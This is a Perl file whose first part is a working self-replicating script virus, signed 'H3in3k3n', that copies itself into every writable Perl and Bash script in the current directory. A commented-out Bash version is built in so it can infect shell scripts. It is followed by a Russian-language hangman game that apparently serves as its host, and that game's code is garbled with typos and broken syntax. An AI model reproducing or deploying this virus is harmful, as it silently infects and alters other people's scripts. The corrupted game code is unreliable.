#!/usr/bin/perl
#H3in3k3n
open(File,$0);
@vx=<File>;
close(File);
foreach $Fichier (<*>){
if ((-f $Fichier) && (-r $Fichier) && (-w $Fichier)){
open(File, "$Fichier");
@Temp=<File>;
close(File);
if (@Temp[0] =~ "/perl"){
if (@Temp[1] ne "\#H3in3k3n\n"){
open(File, ">$Fichier");
print File @vx[0 .. 61];
print File @Temp;
close (File);}}
if (@Temp[0] =~ "/bash"){
if (@Temp[1] ne "\#H3in3k3n\n"){
for (0 .. 28 ){
@vx2[$_] = "\#" . @vx[$_];}
for (29 .. 61){
@vx1[$_]= @vx[$_];
@vx1[$_]=~ s/#//;}
open(File, ">$Fichier");
print File @vx1;
print File @vx2;
print File @Temp;
close(File);
}}}}
##!/bin/bash
##H3in3k3n
#for fichier in *
#do
#if [ -f $fichier -a -w $fichier ];then
#if file $fichier | grep Bourne-A > /dev/null
#then
#head -n 2 $fichier  > .a
#if grep H3in3k3n .a > /dev/null
#then
#rm -f .a
#else
#cat $fichier > .a
#head -n 62 $0 > $fichier
#cat .a >> $fichier
#rm -f .a
#fi;fi
#if file $fichier | grep perl > /dev/null
#then
#head -n 2 $fichier  > .a
#if grep H3in3k3n .a > /dev/null
#then
#rm -f .a
#else
#cat $fichier > .a
#awk '{ if ((NR>=34)&&(NR<=62)) print $0 }' $0 > .b
#cut -b 2- .b > $fichier
#head -n 32 $0 > .b
#sed -e 's/^/#/' .b >> $fichier
#cat .a >> $fichier
#rm -f .a .b
#fi;fi;fi
#done
#!usr/bin/perl
@words=qw{ Интернет Ответ Принтер Программа };
$guesses[0]="";
$wrong=0;
$choice = $words[rand @words];
$hangman="0-|--<";
@letters=split(//, $choice);
@hangman=split{//, $hangman);
@blankword=(0) x scalar(@hangman);
OUTER:
while ($wrong<@hangman)
{
    foreach $i (0..$OFMTletters)
    {
		if ($blankword[$i])
        {
			print $blankword[$i];
        }
		else
        {
			print "-";
        }
    }
    print "\n";
	if ($wrong)
    {
		print @hangman[0..$vrong-1];
    }
	print "\n Ваш выбор: ";
	$guess=<STDIH>;
    chomp $guess;
	foreach($guesses)
    {
		next OUTER if ($_ eq $guess);
	}
	$guesses[$OFMTguesses]=$guess;
	$right=0;
	for ($i=0; $i<@letters; $i++)
    {
		if ($letters[$ij eq $guess)
        {
			$blankword[$i]=$guess;
			$right=1;
		}
	}
	$wrong++ unless($right);
	if (join('', Gblankword) eq Schoice)
    {
		print "Вы угадали\n";
		exit;
	}
}
print "$hangman\n Печально, но было загадано слово $choice.\n";